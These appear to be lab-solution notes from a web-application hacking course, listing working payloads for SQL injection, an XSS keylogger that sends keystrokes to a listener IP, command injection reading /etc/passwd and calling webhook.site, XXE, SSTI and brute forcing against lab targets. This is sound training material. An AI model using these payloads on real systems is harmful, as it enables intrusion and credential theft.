# Lab solutions

## Injection0x01

- basic SQLi

## Injection0x02

- login as jeremy:jeremy
- check the cookie used as a session token
- break it by adding a '
- notice the page doesn't show the welcome message now that there is a SQL error
- write a script to extract jessamy's password

## Injection0x03

- sushi shop
- product search
- UNION select to enum other tables
- find creds & login

## Injection 0x04

`' OR '1'='1` as username for second order SQLi

`Tanjyoubi Sushi Rack' UNION SELECT username,password,null,null from injection0x03_users-- -`

## XSS 0x01

`<img src=x onerror=alert(1);>`

## XSS 0x02

`<img src=x onerror=alert(1);>`

`<script>function logKey(event){fetch("http://10.10.100.146:4444/e?c=" + event.key)} document.addEventListener('keydown', logKey);</script>`

## XSS 0x03

## Command Inj 0x01

`https://tcm-sec.com; whoami; asd`
`; cat /etc/passwd; asd`

## Command Inj 0x02

`https://tcm-sec.com/& whoami& asd`
`https://tcm-sec.com/ | sleep 10 | asd`

`https://webhook.site/<id>/?`whoami``

## Command Inj 0x03

`45123)^2))}';whoami;#`

## File upload 0x01

- Intercept
- Change contents
- Or turn off JS

## File upload 0x02

- Bypass the client-side again
- Intercept and change the content-type to image/png or image/jpeg

## File upload 0x03

- Bypass the client-side again
- Intercept and change the content-type again
- Use an extension that's not in the blocklist (.phtml)

## Authentication 0x01

- Brute force

## Authentication 0x02

- MFA code, switch username (code is OK for all users)
- Or, just brute the code

## Authentication 0x03

- Account lockout after 5 attempts, therefore brute the top 4 passwords against a username list

- common password list:

```
password
password123
letmein
manchesterunited
```

- common usernames list: `/usr/share/seclists/Usernames/Names/names.txt`

## XXE, IDOR, capstone

### XXE 0x01

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >]>
<creds><user>username</user><password>pass</password></creds>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds><user>&xxe;</user><password>pass</password></creds>
```

### IDOR

`fuzz the parameter`

- find an admin user (or all of the admin users)

### SSTI 0x01

```
{{5*5}}
{{['cat\x20/etc/passwd']|filter('system')}}
```

###

### Capstone

SQLi to get into admin panel
File upload to get RCE

- XSS in the message alert
- XSS in account names probably? need to test

- brute force user accounts

- SQLi on adding rating

`http://localhost/capstone/coffee.php?coffee=3' or 1=1-- -`

`http://localhost/capstone/coffee.php?coffee=1%27%20union%20select%20null,username,password,null,null,null,null%20from%20users--%20-`
